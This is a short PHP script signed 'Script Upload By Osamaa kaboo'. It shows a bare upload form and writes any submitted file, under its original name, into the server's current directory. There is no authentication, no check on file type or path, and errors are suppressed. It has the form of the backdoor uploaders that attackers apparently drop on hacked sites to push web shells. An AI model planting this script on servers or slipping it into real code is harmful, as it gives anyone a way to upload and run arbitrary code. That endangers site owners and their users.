<?php
echo '<center><font color="Red" size="4">';
/// Script Upload By Osamaa kaboo \\\
if(isset($_POST['Submit'])){
	$filedir = ""; 
	$maxfile = '2000000';
	$mode = '0644';
	$userfile_name = $_FILES['image']['name'];
	$userfile_tmp = $_FILES['image']['tmp_name'];
	if(isset($_FILES['image']['name'])) {
		$qx = $filedir.$userfile_name;
		@move_uploaded_file($userfile_tmp, $qx);
		@chmod ($qx, octdec($mode));
echo"<center><b>Done ==> $userfile_name</b></center>";
}
}
else{
echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';
?>